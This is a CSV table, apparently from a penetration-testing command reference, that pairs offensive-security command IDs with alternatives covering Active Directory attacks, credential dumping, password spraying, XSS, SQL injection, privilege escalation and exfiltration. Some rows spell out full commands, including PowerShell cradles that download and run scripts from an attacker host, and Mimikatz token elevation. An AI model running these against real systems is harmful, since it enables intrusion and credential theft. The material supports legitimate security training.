"command_id","alternative_command_id"
"nmap-vuln-scan","nessus-scan"
"dns-enum","dnsenum-domain"
"smb-null-session-shares","smb-smbmap-recursive"
"smb-null-session-shares","smb-crackmapexec-shares"
"smb-enum4linux-full","smb-crackmapexec-shares"
"smb-enum4linux-full","smb-null-session-shares"
"smb-crackmapexec-shares","smb-smbmap-recursive"
"smb-crackmapexec-shares","smb-enum4linux-full"
"smb-smbclient-connect","smb-mount-share"
"smb-smbclient-connect","smb-smbmap-recursive"
"smb-smbmap-recursive","smb-smbclient-connect"
"smb-smbmap-recursive","smb-mount-share"
"smb-mount-share","smb-smbclient-connect"
"smb-mount-share","smb-smbmap-recursive"
"curl-header-enum","whatweb-technology-detection"
"curl-header-enum","nmap-service-scan"
"whatweb-technology-detection","curl-header-enum"
"whatweb-technology-detection","nmap-service-scan"
"iptables-list-rules","ufw-status"
"iptables-list-rules","firewalld-list-all"
"iptables-allow-port","ufw-allow-port"
"ufw-status","iptables-list-rules"
"ufw-status","firewalld-list-all"
"ufw-allow-port","iptables-allow-port"
"firewalld-list-all","iptables-list-rules"
"firewalld-list-all","ufw-status"
"netsh-firewall-show","netsh-firewall-show-state"
"netsh-firewall-show-state","netsh-firewall-show"
"service-ssh-start-sysvinit","systemctl-start-ssh"
"nmap-localhost-verification","netstat-listening-tcp"
"nmap-localhost-verification","ss-listening-all"
"ssh-local-port-forward-inline","ssh-local-port-forward"
"crackmapexec-smb-framework","cme-smb-shares"
"wmic-os-version-specific","systeminfo-windows"
"wmic-os-version-specific","get-computerinfo"
"whoami-all-windows","whoami-priv"
"chisel-http-tunneling","ssh-dynamic-port-forward"
"chisel-http-tunneling","sshuttle-vpn"
"plink-remote-forward-windows","plink-remote-forward"
"proxychains-config-verify","proxychains-config"
"systemctl-start-ssh","service-ssh-start-sysvinit"
"ss-listening-ports","nmap-localhost-verification"
"ip-route","netstat-routing-table"
"nmap-port-check","curl-http-service-verification"
"plink-remote-forward","chisel-http-tunneling"
"ssh-connect-password","ssh-key-authentication"
"rustscan-fast-scan","nmap-quick-scan"
"rustscan-fast-scan","masscan-fast-scan"
"enum4linux-smb","enum4linux-ng"
"enum4linux-ng","enum4linux-smb"
"dnsrecon-domain","dnsenum-domain"
"dnsrecon-domain","dig-zone-transfer"
"ffuf-dir-fuzz","gobuster-dir-basic"
"ffuf-dir-fuzz","wfuzz-dir"
"gobuster-dir-basic","ffuf-dir-fuzz"
"gobuster-dir-basic","wfuzz-dir"
"wfuzz-dir","gobuster-dir-basic"
"wfuzz-dir","ffuf-dir-fuzz"
"php-http-server","ruby-http-server"
"ruby-http-server","php-http-server"
"powershell-wget","powershell-invoke-webrequest"
"socat-listener","nc-listener"
"hashid-identify","hash-identifier"
"smbexec-shell","psexec-shell"
"smbexec-shell","wmiexec-shell"
"secretsdump-hashes","ad-dcsync-mimikatz-single-user"
"secretsdump-hashes","ad-dcsync-impacket-secretsdump-user"
"sc-qc-service","get-service"
"ldap-dn-path-check","ldapsearch-ad"
"check-robots-txt","nikto-scan"
"awk-print","cut-fields"
"cut-fields","awk-print"
"base64-encode","base64-decode"
"base64-decode","base64-encode"
"xxd-hex","hexdump-file"
"hexdump-file","xxd-hex"
"od-octal-dump","xxd-hex"
"od-octal-dump","hexdump-file"
"pip-install","pip3-install"
"pip3-install","pip-install"
"yum-install","dnf-install"
"yum-install","apt-install"
"dnf-install","yum-install"
"dnf-install","apt-install"
"go-get","go-install"
"go-install","go-get"
"choco-install","winget-install"
"winget-install","choco-install"
"scoop-install","choco-install"
"scoop-install","winget-install"
"traceroute-host","tracert-windows"
"tracert-windows","traceroute-host"
"dig-dns","nslookup-dns"
"dig-dns","host-dns"
"nslookup-dns","dig-dns"
"nslookup-dns","host-dns"
"host-dns","dig-dns"
"host-dns","nslookup-dns"
"curl-url","wget-url"
"wget-url","curl-url"
"scp-file","rsync-files"
"rsync-files","scp-file"
"telnet-connect","nc-connect"
"chmod-executable","chmod-numeric-permissions"
"chmod-numeric-permissions","chmod-executable"
"chmod-writable","chmod-numeric-permissions"
"cp-file","rsync-files"
"cat-file","head-file"
"cat-file","tail-file"
"cat-file","less-file"
"head-file","cat-file"
"head-file","less-file"
"tail-file","cat-file"
"tail-file","less-file"
"less-file","cat-file"
"tar-extract","unzip-file"
"tar-extract","gunzip-decompress"
"unzip-file","tar-extract"
"gzip-compress","tar-create"
"gunzip-decompress","tar-extract"
"verify-curl-available","python-http-server"
"verify-curl-available","nc-file-transfer"
"verify-credentials","verify-credentials"
"verify-credentials","verify-credentials"
"verify-port-open","nmap-port-check"
"verify-smb-null-session","smb-crackmapexec-shares"
"ft-certutil-download","ft-powershell-iwr"
"ft-certutil-download","ft-powershell-webclient"
"ft-certutil-download","ft-bitsadmin-download"
"ft-powershell-iwr","ft-certutil-download"
"ft-powershell-iwr","ft-powershell-webclient"
"ft-powershell-webclient","ft-powershell-iwr"
"ft-powershell-webclient","ft-certutil-download"
"ft-smb-download","ft-certutil-download"
"ft-smb-download","ft-powershell-webclient"
"ft-bitsadmin-download","ft-certutil-download"
"ft-bitsadmin-download","ft-powershell-webclient"
"ft-powershell-upload","ft-smb-upload"
"ft-powershell-upload","ft-nc-send"
"ft-powershell-upload","exfil-powershell-base64"
"ft-smb-upload","ft-powershell-upload"
"ft-smb-upload","ft-nc-send"
"ft-curl-upload","ft-nc-send"
"ft-curl-upload","ft-scp-upload"
"ft-nc-receive","ft-uploadserver"
"ft-nc-receive","ft-smb-server"
"ft-nc-send","ft-curl-upload"
"ft-nc-send","ft-bash-dev-tcp"
"ft-powershell-tcp-send","ft-nc-send"
"ft-powershell-tcp-send","ft-powershell-upload"
"ft-powershell-tcp-send","ft-smb-upload"
"ft-file-verify-md5","sha256sum <FILE> (SHA-256, more secure but slower)"
"ft-file-verify-md5","Get-FileHash <FILE> (PowerShell on Windows)"
"ft-file-verify-md5","certutil -hashfile <FILE> MD5 (Windows built-in)"
"ft-powershell-execute-memory","IWR -Uri http://<LHOST>/<SCRIPT>.ps1 -UseBasicParsing | IEX (PowerShell 3.0+)"
"ft-powershell-execute-memory","(New-Object Net.WebClient).DownloadString('http://<LHOST>/script.ps1') | IEX (explicit pipe)"
"ft-powershell-execute-memory","IEX (Get-Content \\<LHOST>\share\script.ps1 -Raw) (SMB-based)"
"ft-base64-encode","ft-nc-send"
"ft-base64-encode","ft-curl-upload"
"ft-scp-upload","ft-wget-download"
"ft-scp-upload","ft-curl-upload"
"ft-scp-download","ft-curl-upload"
"ft-scp-download","ft-nc-send"
"ft-wget-download","ft-curl-download"
"ft-wget-download","ft-bash-dev-tcp"
"ft-curl-download","ft-wget-download"
"ft-curl-download","ft-bash-dev-tcp"
"ft-bash-dev-tcp","ft-wget-download"
"ft-bash-dev-tcp","ft-curl-download"
"ft-python-http-server","php-http-server"
"ft-python-http-server","ruby-http-server"
"ft-smb-server","ft-python-http-server"
"ft-uploadserver","ft-smb-server"
"ft-uploadserver","ft-nc-receive"
"lsof-network-all","netstat-listening-tcp"
"lsof-network-all","ss-listening-all"
"lsof-listening-ports","netstat-listening-tcp"
"lsof-listening-ports","ss-listening-ports"
"lsof-port-specific","fuser-port-tcp"
"fuser-port-tcp","lsof-port-specific"
"netstat-listening-tcp","ss-listening-all"
"netstat-listening-tcp","lsof-listening-ports"
"ss-listening-all","netstat-listening-tcp"
"ss-listening-all","lsof-listening-ports"
"win-netstat-process-mapping","win-ps-netstat-process"
"win-ps-netstat-process","win-netstat-process-mapping"
"win-tasklist-pid","win-wmic-process-pid"
"win-tasklist-pid","win-ps-get-process"
"win-wmic-process-pid","win-tasklist-pid"
"systemctl-running-services","service-status-all-sysv"
"service-status-all-sysv","systemctl-running-services"
"win-sc-query-services","win-wmic-service-full"
"win-sc-query-services","win-ps-get-service"
"win-sc-query-all","win-wmic-service-full"
"win-sc-query-all","get-service"
"win-sc-query-config","win-wmic-service-path"
"win-wmic-service-full","win-sc-query-all"
"win-wmic-service-full","win-ps-get-service"
"win-wmic-service-path","win-sc-query-config"
"win-wmic-service-path","win-unquoted-service-paths"
"win-ps-get-service","win-sc-query-services"
"win-ps-get-service","win-wmic-service-full"
"win-ps-get-service-details","win-wmic-service-path"
"win-ps-get-service-details","win-sc-query-config"
"ps-grep-pattern","ps-aux-full"
"ps-grep-pattern","ps-grep-pattern"
"ps-grep-extract-pid","ps-grep-pattern"
"crontab-user-direct-read","crontab-user-list"
"less-etc-crontab","crontab-system-wide"
"tail-follow-syslog","journalctl-follow"
"journalctl-kernel-messages","dmesg-kernel-messages"
"journalctl-kernel-follow","dmesg-follow"
"ls-init-d","systemctl-list"
"top-snapshot-batch","ps-aux-full"
"ls-proc-fd-all","lsof-list"
"lsof-directory-non-recursive","lsof-directory-usage"
"crontab-system-wide","less-etc-crontab"
"win-schtasks-list-all","win-ps-scheduled-tasks"
"win-schtasks-list-all","get-scheduledtask"
"win-ps-scheduled-tasks","win-schtasks-list-all"
"tail-follow-log","tail-follow-multiple"
"tail-follow-log","journalctl-follow"
"journalctl-follow","tail-follow-log"
"grep-auth-failed","lastb-failed-logins"
"lastb-failed-logins","grep-auth-failed"
"journalctl-boot-messages","dmesg-kernel-messages"
"systemctl-list","service --status-all"
"systemctl-list","chkconfig --list"
"systemctl-list","ls-init-d"
"lsof-list","netstat -tulpn"
"lsof-list","ss -tulpn"
"lsof-list","ls-proc-fd-all"
"lsof-list","netstat-listening-ports"
"free-memory-human","cat-proc-meminfo"
"uptime-load-average","cat-proc-loadavg"
"lsof-directory-usage","fuser-directory-processes"
"fuser-directory-processes","lsof-directory-usage"
"who-logged-in","w-user-activity"
"lastlog-user-last","last-login-history"
"ps-aux-full","ps-ef-full"
"ps-aux-full","top-snapshot"
"ps-aux-full","pstree-hierarchy"
"ps-auxww-no-truncate","ps-ef-full"
"ps-ef-full","ps-aux-full"
"ps-ef-full","pstree-hierarchy"
"pstree-hierarchy","ps-ef-full"
"top-snapshot","ps-sort-cpu"
"win-tasklist-verbose","win-wmic-process-full"
"win-tasklist-verbose","win-ps-get-process"
"win-tasklist-services","win-wmic-service-full"
"win-tasklist-services","win-ps-get-service"
"win-wmic-process-full","win-ps-get-process-detailed"
"win-wmic-process-full","win-tasklist-verbose"
"win-ps-get-process","win-tasklist-verbose"
"win-ps-get-process","win-wmic-process-full"
"win-ps-get-process-detailed","win-wmic-process-full"
"import-powerview","import-sharphound"
"import-powerview","ldapsearch-ad"
"get-netdomain","ldapsearch-dump"
"get-netuser","net-user-domain-list"
"get-netuser","ps-ldapsearch-users"
"get-netuser","get-aduser"
"get-netgroup","net-group-domain-list"
"get-netgroup","ps-ldapsearch-groups"
"get-netgroup","get-adgroup"
"get-netcomputer","get-adcomputer"
"get-netcomputer","ps-ldapsearch-computers"
"invoke-sharefinder","smb-crackmapexec-shares"
"invoke-sharefinder","smb-enum"
"invoke-sharefinder","net-view-shares"
"get-netgpo","get-netgpo"
"get-domainsid","get-domainsid"
"kerbrute-userenum-ad","enum4linux-users-ad"
"kerbrute-userenum-ad","ldapsearch-users-ad"
"crackmapexec-rid-cycling","kerbrute-userenum-ad"
"crackmapexec-rid-cycling","enum4linux-users-ad"
"crackmapexec-rid-cycling","ldapsearch-users-ad"
"ldapsearch-users-ad","kerbrute-userenum-ad"
"ldapsearch-users-ad","enum4linux-users-ad"
"ldapsearch-users-ad","crackmapexec-rid-cycling"
"enum4linux-users-ad","kerbrute-userenum-ad"
"enum4linux-users-ad","crackmapexec-rid-cycling"
"enum4linux-users-ad","ldapsearch-users-ad"
"spray-passwords-ldap","crackmapexec-smb-spray"
"spray-passwords-ldap","kerbrute-passwordspray"
"spray-passwords-ldap","crackmapexec-winrm-spray"
"crackmapexec-smb-spray","spray-passwords-ldap"
"crackmapexec-smb-spray","kerbrute-passwordspray"
"crackmapexec-smb-spray","crackmapexec-winrm-spray"
"kerbrute-passwordspray","spray-passwords-ldap"
"kerbrute-passwordspray","crackmapexec-smb-spray"
"kerbrute-passwordspray","crackmapexec-winrm-spray"
"crackmapexec-winrm-spray","crackmapexec-smb-spray"
"crackmapexec-winrm-spray","spray-passwords-ldap"
"crackmapexec-winrm-spray","kerbrute-passwordspray"
"ad-dcsync-mimikatz-user","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-krbtgt","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-administrator","ad-dcsync-secretsdump-user"
"ad-dcsync-mimikatz-administrator","ad-dcsync-mimikatz-user"
"ad-golden-ticket-dcsync-krbtgt","ad-golden-ticket-lsa-dump-krbtgt"
"ad-golden-ticket-lsa-dump-krbtgt","ad-golden-ticket-dcsync-krbtgt"
"ad-golden-ticket-purge-tickets","kerberos-klist-purge"
"ad-golden-ticket-mimikatz-create","ad-golden-ticket-rubeus-create"
"ad-golden-ticket-rubeus-create","ad-golden-ticket-mimikatz-create"
"ad-golden-ticket-verify-klist","rubeus-klist-display"
"impacket-getnpusers-asreproast","rubeus-asreproast"
"impacket-getnpusers-asreproast","impacket-getnpusers-identify"
"impacket-getnpusers-identify","powerview-asreproast-identify"
"rubeus-asreproast","impacket-getnpusers-asreproast"
"powerview-asreproast-identify","impacket-getnpusers-identify"
"enter-pssession","invoke-command"
"invoke-command","enter-pssession"
"test-admin-share-access","net-use-admin-share"
"test-admin-share-access","dir-admin-share"
"copy-file-admin-share","copy-file-admin-share"
"ad-check-vss-service","ad-dcsync-ntds-credentials"
"ad-vssadmin-create-shadow","ad-vshadow-create-shadow"
"ad-vssadmin-create-shadow","ad-diskshadow-create-shadow"
"ad-vshadow-create-shadow","ad-vssadmin-create-shadow"
"ad-vshadow-create-shadow","ad-diskshadow-create-shadow"
"ad-diskshadow-create-shadow","ad-vssadmin-create-shadow"
"ad-diskshadow-create-shadow","ad-vshadow-create-shadow"
"ad-wmic-create-shadow","ad-vssadmin-create-shadow"
"ad-wmic-create-shadow","ad-vshadow-create-shadow"
"ad-wmic-create-shadow","ad-diskshadow-create-shadow"
"ad-dcsync-mimikatz-single-user","ad-dcsync-impacket-secretsdump-user"
"ad-dcsync-mimikatz-single-user","ad-dcsync-mimikatz-user"
"ad-dcsync-impacket-secretsdump-user","ad-dcsync-mimikatz-single-user"
"ad-dcsync-impacket-secretsdump-user","ad-dcsync-impacket-secretsdump-user"
"ad-dcsync-check-domain-admins","ad-dcsync-check-user-groups"
"ad-dcsync-check-domain-admins","ad-dcsync-check-replication-rights"
"ad-dcsync-check-user-groups","ad-dcsync-check-domain-admins"
"ad-dcsync-check-user-groups","ad-dcsync-check-replication-rights"
"ad-dcsync-check-replication-rights","ad-dcsync-check-domain-admins"
"ad-dcsync-check-replication-rights","ad-dcsync-check-user-groups"
"crackmapexec-validate-admin","kerbrute-validate-creds"
"crackmapexec-validate-admin","pth-evil-winrm"
"crackmapexec-validate-admin","ftp-connect"
"kerbrute-validate-creds","crackmapexec-validate-admin"
"kerbrute-validate-creds","ftp-connect"
"kerbrute-validate-creds","pth-evil-winrm"
"impacket-getuserspns-kerberoast","rubeus-kerberoast"
"impacket-getuserspns-kerberoast","powerview-kerberoast"
"impacket-getuserspns-list","setspn-list-user-spns"
"rubeus-kerberoast","impacket-getuserspns-kerberoast"
"rubeus-kerberoast","powerview-kerberoast"
"rubeus-kerberoast-aes","rubeus-kerberoast"
"powerview-kerberoast","rubeus-kerberoast"
"powerview-kerberoast","impacket-getuserspns-kerberoast"
"setspn-list-user-spns","impacket-getuserspns-list"
"crackmapexec-sam-dump","ad-sam-dump-reg-save"
"download-powerview","curl-download-powerview"
"curl-download-powerview","download-powerview"
"set-executionpolicy-bypass","powershell-ep-bypass-flag"
"powershell-ep-bypass-flag","set-executionpolicy-bypass"
"ad-dcsync-secretsdump-user","ad-dcsync-mimikatz-user"
"ad-dcsync-secretsdump-user","ad-dcsync-secretsdump-all"
"ad-dcsync-secretsdump-krbtgt","ad-dcsync-mimikatz-krbtgt"
"ad-dcsync-secretsdump-all","ad-dcsync-secretsdump-user"
"net-accounts-policy","enum4linux-policy"
"net-accounts-policy","crackmapexec-policy"
"net-accounts-policy","ldapsearch-policy"
"enum4linux-policy","net-accounts-policy"
"enum4linux-policy","crackmapexec-policy"
"enum4linux-policy","ldapsearch-policy"
"crackmapexec-policy","net-accounts-policy"
"crackmapexec-policy","enum4linux-policy"
"crackmapexec-policy","ldapsearch-policy"
"ldapsearch-policy","net-accounts-policy"
"ldapsearch-policy","enum4linux-policy"
"ldapsearch-policy","crackmapexec-policy"
"ad-silver-ticket-mimikatz-create","ad-silver-ticket-rubeus-create"
"ad-silver-ticket-mimikatz-create","overpass-mimikatz-pth"
"ad-silver-ticket-rubeus-create","ad-silver-ticket-mimikatz-create"
"ad-enumerate-spn-target","powerview-enumerate-spns"
"ad-enumerate-spn-target","impacket-getuserspns-list"
"ad-pass-the-hash-crackmapexec","ad-pass-the-hash-impacket-psexec"
"ad-pass-the-hash-crackmapexec","ad-pass-the-hash-impacket-wmiexec"
"ad-pass-the-hash-impacket-psexec","ad-pass-the-hash-impacket-wmiexec"
"ad-pass-the-hash-impacket-psexec","ad-pass-the-hash-crackmapexec"
"ad-pass-the-hash-impacket-wmiexec","ad-pass-the-hash-impacket-psexec"
"ad-pass-the-hash-impacket-wmiexec","ad-pass-the-hash-crackmapexec"
"xss-test-svg-onload","xss-test-body-onload"
"xss-test-svg-onload","xss-test-img-onerror"
"xss-test-svg-onload","xss-test-script-basic"
"xss-test-body-onload","xss-test-svg-onload"
"xss-test-body-onload","xss-test-img-onerror"
"xss-test-body-onload","xss-test-script-basic"
"xss-test-img-onerror","xss-test-svg-onload"
"xss-test-img-onerror","xss-test-body-onload"
"xss-test-img-onerror","xss-test-script-basic"
"xss-test-script-basic","xss-test-img-onerror"
"xss-test-script-basic","xss-test-svg-onload"
"xss-test-script-basic","xss-test-script-context-break"
"xss-test-script-context-break","xss-test-script-basic"
"xss-test-script-context-break","xss-test-event-context-break"
"xss-test-event-context-break","xss-test-script-context-break"
"xss-test-event-context-break","xss-test-img-onerror"
"xss-filter-bypass-case","xss-filter-bypass-encoding"
"xss-filter-bypass-case","xss-test-img-onerror"
"xss-filter-bypass-encoding","xss-filter-bypass-case"
"xss-filter-bypass-encoding","xss-filter-bypass-encoding"
"xss-cookie-stealer","xss-session-hijack-fetch"
"xss-session-hijack-fetch","xss-cookie-stealer"
"sqli-detection-error","sqlmap-post-exploitation"
"sqli-column-enum-orderby","sqlmap-post-exploitation"
"sqli-union-select-basic","sqlmap-post-exploitation"
"sqli-union-mysql-info","sqlmap-post-exploitation"
"sqli-union-postgresql-info","sqlmap-post-exploitation"
"sqli-union-mssql-info","sqlmap-post-exploitation"
"sqlmap-post-exploitation","sqli-detection-error"
"sqlmap-post-exploitation","sqli-column-enum-orderby"
"sqlmap-post-exploitation","sqli-union-select-basic"
"wpscan-enumerate-all","wordpress-manual-version"
"wpscan-enumerate-all","whatweb-enum"
"wpscan-enumerate-all","nikto-scan"
"wpscan-aggressive-detection","wordpress-manual-version"
"wpscan-password-attack","burp-intruder"
"wordpress-manual-version","whatweb-enum"
"wordpress-manual-version","wpscan-enumerate-all"
"curl-ua-poison-apache","lfi-access-log-apache"
"curl-ua-poison-apache","lfi-rce-trigger"
"wfuzz-params","burp-intruder"
"user-registration-test","burpsuite-modify-upload"
"burpsuite-modify-upload","create-php-webshell"
"sqlmap-from-request","sqli-manual-test"
"sqlmap-from-request-level3","sqlmap-from-request"
"sqlmap-enumerate-databases","sqli-union-mysql-info"
"sqlmap-enumerate-tables","sqli-union-mysql-info"
"sqlmap-dump-table","sqli-union-mysql-info"
"curl-wordpress-version-feed","wpscan-enumerate-all"
"powerview-get-netdomain","ps-get-current-domain"
"powerview-get-netdomaincontroller","ps-get-pdc"
"powerview-get-netuser","net-user-domain-list"
"powerview-get-netuser","ps-directorysearcher-users"
"powerview-get-netuser-filter","net-user-domain-detail"
"powerview-get-netuser-spn","setspn-query-all"
"powerview-get-netgroup","net-group-domain-list"
"powerview-get-netgroup","ps-directorysearcher-groups"
"powerview-get-netgroup-specific","net-group-domain-members"
"powerview-get-netgroupmember","powerview-get-netgroup-specific"
"powerview-get-netgroupmember","net-group-domain-members"
"powerview-get-netcomputer","ps-directorysearcher-computers"
"powerview-get-netcomputer","dsquery-computer"
"ps-get-current-domain","get-netdomain"
"ps-get-pdc","net-domain-controllers"
"ps-directorysearcher-users","get-netuser"
"ps-directorysearcher-groups","get-netgroup"
"ps-directorysearcher-computers","get-netcomputer"
"ps-directorysearcher-computers","dsquery-computer"
"ps-ldapsearch-users","get-netuser"
"ps-ldapsearch-computers","get-netcomputer"
"ps-ldapsearch-groups","get-netgroup"
"ps-ldapsearch-spns","get-netuser"
"powerview-get-netsession","psloggedon"
"powerview-get-netloggedon","psloggedon"
"sysinternals-psloggedon","powerview-get-netloggedon"
"net-view-shares","powerview-find-domainshare"
"gpp-password-files","get-gpppassword"
"net-user-domain-list","get-netuser"
"net-group-domain-list","get-netgroup"
"setspn-query-all","get-netuser"
"dsquery-user","net-user-domain-list"
"dsquery-user","get-netuser"
"dsquery-computer","get-netcomputer"
"dsquery-group","net-group-domain-list"
"dsquery-group","get-netgroup"
"net-group-domain-computers","get-netcomputer"
"net-domain-controllers","net-domain-controllers"
"setspn-list-all","get-netuser"
"dsquery-users","get-netuser"
"dsquery-computers","get-netcomputer"
"dsquery-domain-controllers","net-domain-controllers"
"powerview-get-objectacl","get-acl"
"powerview-get-netcomputer-os","get-adcomputer"
"powerview-get-netcomputer-os","crackmapexec-smb-spray"
"query-hkey-users-remote","psloggedon"
"ad-sid-whoami-extract","ad-sid-powerview-domain"
"ad-sid-whoami-extract","ad-sid-wmic-extract"
"ad-sid-powerview-domain","ad-sid-whoami-extract"
"ad-sid-powerview-domain","ad-sid-wmic-extract"
"ad-sid-wmic-extract","ad-sid-whoami-extract"
"ad-sid-wmic-extract","ad-sid-powerview-domain"
"ps-get-group-members-basic","powerview-get-netgroupmember"
"ps-nested-group-check-member-type","powerview-get-netgroupmember"
"ps-nested-group-recursive-function","powerview-get-netgroupmember"
"ps-get-last-nested-user","powerview-get-netuser"
"ps-find-new-domain-admin","powerview-get-netgroupmember"
"powerview-get-domaingroup-recursive","ps-nested-group-recursive-function"
"ps-powerview-get-user-details","ps-get-last-nested-user"
"ps-extract-flag-from-user","ps-get-last-nested-user"
"ps-nested-group-one-liner","powerview-get-domaingroup-recursive"
"nessus-scan","nmap-vuln-scan"
"nessus-scan","nikto-scan"
"nessus-scan","whatweb-enum"
"burp-intruder","wfuzz-params"
"burp-intruder","ffuf-param-fuzz"
"burp-intruder","wfuzz-dir"
"burp-scanner","nikto-scan"
"burp-scanner","sqlmap-basic"
"burp-scanner","wfuzz-params"
"wfuzz-z-file","ffuf-dir-fuzz"
"wfuzz-z-file","gobuster-dir"
"wfuzz-z-file","wfuzz-params"
"wfuzz-post-login-brute","hydra-http-post-form"
"wfuzz-post-login-brute","ffuf-param-fuzz"
"wfuzz-post-login-brute","burp-intruder"
"dirbuster","gobuster-dir"
"dirbuster","ffuf-dir-fuzz"
"masscan-full-tcp","nmap-port-check"
"masscan-full-tcp","nmap-service-scan"
"gpp-decrypt-python-script","get-gpppassword"
"manual-hash-generation-loop","john-show-cracked"
"python-http-server","python-m-simplehttpserver"
"rdesktop-disk-share","smb-server"
"rdesktop-disk-share","scp-transfer"
"ftp-transfer","python-m-simplehttpserver"
"invoke-watson","win-privesc-winpeas"
"find-suid-usr-bin","find-suid-binaries"
"gtfobins-capability-lookup","searchsploit-linux-capability"
"powershell-wget-alias","certutil-download"
"windows-hashcat-crack-ntlm","windows-hashcat-crack-ntlm-file"
"windows-hashcat-crack-ntlm","john-crack-ntlm"
"windows-hashcat-crack-ntlm-file","windows-hashcat-crack-ntlm"
"windows-hashcat-crack-ntlm-file","john-crack-ntlm-rules"
"windows-rdp-xfreerdp","ad-pass-the-hash-impacket-psexec"
"windows-rdp-xfreerdp","evil-winrm-shell"
"linux-kernel-exploit","cat-proc-version"
"linux-nfs-root-squash","showmount-e-localhost"
"linux-systemctl-privesc","getcap-bin-systemctl"
"linux-unix-privesc-check-nc","linux-linpeas-http"
"linux-unix-privesc-check-nc","linux-linpeas-nc"
"linux-unix-privesc-check-nc","linux-suid-find"
"linux-find-world-writable","linux-find-writable-etc-focused"
"linux-find-world-writable","linux-writable-passwd"
"linux-find-world-writable","linux-unix-privesc-check-nc"
"linux-find-writable-etc-focused","linux-find-world-writable"
"linux-find-writable-etc-focused","linux-writable-passwd"
"linux-find-writable-etc-focused","linux-test-file-writable"
"linux-linpeas-http","linux-linpeas-nc"
"linux-linpeas-http","linux-linpeas"
"linux-linpeas-http","linux-unix-privesc-check-nc"
"linux-linpeas-nc","linux-linpeas-http"
"linux-linpeas-nc","linux-linpeas"
"linux-linpeas-nc","linux-unix-privesc-check-nc"
"linux-linpeas-save-output","linux-linpeas-http"
"linux-linpeas-save-output","linux-linpeas"
"linux-linpeas-save-output","linux-parse-linpeas-writable"
"linux-test-file-writable","linux-writable-passwd"
"linux-test-file-writable","linux-find-world-writable"
"linux-test-file-writable","linux-find-writable-etc-focused"
"linux-check-shadow-readable","linux-find-world-writable"
"linux-check-shadow-readable","linux-test-file-writable"
"linux-parse-linpeas-writable","linux-find-world-writable"
"linux-parse-linpeas-writable","linux-find-writable-etc-focused"
"linux-parse-linpeas-writable","linux-linpeas-save-output"
"linux-find-writable-services-systemd","linux-writable-services"
"linux-find-writable-services-systemd","linux-systemctl-privesc"
"invoke-mimikatz-remote","procdump-lsass"
"invoke-mimikatz-remote","comsvcs-lsass-dump"
"procdump-lsass","invoke-mimikatz-remote"
"procdump-lsass","comsvcs-lsass-dump"
"pypykatz-parse","secretsdump-hashes"
"comsvcs-lsass-dump","procdump-lsass"
"comsvcs-lsass-dump","invoke-mimikatz-remote"
"ps-get-process-owner","win-tasklist-verbose"
"file-transfer-certutil","bitsadmin-download"
"exfil-uploadserver","file-transfer-python-http"
"exfil-uploadserver","exfil-smb-upload"
"exfil-powershell-upload","exfil-smb-upload"
"exfil-powershell-upload","exfil-nc-tcp-upload"
"exfil-powershell-upload","exfil-powershell-base64"
"exfil-smb-upload","exfil-powershell-upload"
"exfil-smb-upload","exfil-nc-tcp-upload"
"exfil-nc-tcp-upload","file-transfer-nc-pull"
"exfil-nc-tcp-upload","exfil-powershell-upload"
"exfil-powershell-base64","file-transfer-base64"
"exfil-powershell-base64","exfil-powershell-upload"
"exfil-curl-upload","file-transfer-nc-pull"
"exfil-curl-upload","file-transfer-scp"
"win-unquoted-service-paths","get-unquotedservice"
"win-weak-service-perms","get-modifiableservicefile"
"windows-whoami-privs","whoami-all"
"windows-systeminfo","get-computerinfo"
"windows-service-permissions","sc-sdshow-service"
"windows-kerberoasting","rubeus-kerberoast"
"get-aduser","powerview-get-netuser"
"get-aduser","net-user-domain-list"
"get-aduser","ps-ldapsearch-users"
"get-adgroup","powerview-get-netgroup"
"get-adgroup","net-group-domain-list"
"get-adgroup","ps-ldapsearch-groups"
"get-adgroupmember","powerview-get-netgroupmember"
"get-adgroupmember","net-group-domain-list"
"get-adcomputer","powerview-get-netcomputer"
"get-adcomputer","ps-ldapsearch-computers"
"get-ciminstance","get-wmiobject"
"get-computerinfo","win-systeminfo"
"get-computerinfo","get-ciminstance"
"get-unquotedservice","win-sc-query-services"
"import-module-activedirectory","import-powerview"
"import-module-activedirectory","ldapsearch-ad"
"import-powersploit","import-powerview"
"import-powersploit","import-powerup"
"powershell-runas-basic","fodhelper-uac-bypass"
"powershell-runas-basic","eventvwr-uac-bypass"
"powershell-runas-output-redirect","fodhelper-uac-bypass"
"powershell-runas-output-redirect","eventvwr-uac-bypass"
"powershell-runas-output-redirect","powershell-runas-keepopen"
"powershell-runas-keepopen","fodhelper-uac-bypass"
"powershell-runas-keepopen","eventvwr-uac-bypass"
"powershell-runas-download-execute","fodhelper-uac-bypass"
"powershell-runas-download-execute","eventvwr-uac-bypass"
"powershell-runas-download-execute","win-privesc-powerup"
"windows-net-use-smb-connect","pushd \\\\<TARGET>\\<SHARE> (temporary mapping, auto-disconnects)"
"windows-net-use-smb-connect","New-PSDrive -Name Z -PSProvider FileSystem -Root \\\\<TARGET>\\<SHARE> -Credential $cred (PowerShell)"
"kerberos-klist-purge","mimikatz.exe ""kerberos::purge"" ""exit"" (Mimikatz alternative)"
"kerberos-klist-purge","Rubeus.exe purge (Rubeus alternative)"
"windows-psexec-system-shell","mimikatz.exe ""privilege::debug"" ""token::elevate"" ""exit"" (Mimikatz token elevation)"
"windows-psexec-system-shell","Start-Process cmd.exe -Verb RunAs (PowerShell elevation, requires GUI)"
"powerview-enumerate-spns","Get-ADUser -Filter {ServicePrincipalName -ne '$null'} (ActiveDirectory module)"
"powerview-enumerate-spns","setspn -T <DOMAIN> -Q */* (Windows built-in)"
"powerview-enumerate-spns","GetUserSPNs.py <DOMAIN>/<USER>:<PASS> (Impacket from Kali)"
"ad-dcsync-check-privileges","(Get-Acl 'AD:\DC=corp,DC=com').Access | Where-Object {$_.ObjectType -like '*Replication*'} (ActiveDirectory module)"
"ad-dcsync-check-privileges","adfind.exe -b 'DC=corp,DC=com' -s base nTSecurityDescriptor (ADFind tool)"
"execute-sudo-exploit","sudo-exploit-find"
"execute-sudo-exploit","sudo-exploit-vim"
"execute-sudo-exploit","sudo-exploit-python"
"execute-sudo-exploit","sudo-exploit-less"
"execute-sudo-exploit","sudo-exploit-nmap"
"docker-privileged-escape","docker-mount-escape"
"docker-socket-mount","docker-mount-escape"
"find-suid-binaries","linux-suid-find"
"execute-suid-exploit-find","execute-suid-exploit-find"
"execute-suid-exploit-find","execute-suid-exploit-find"
"execute-suid-exploit-find","execute-sudo-exploit"
"verify-root-access-suid","cat-etc-shadow"
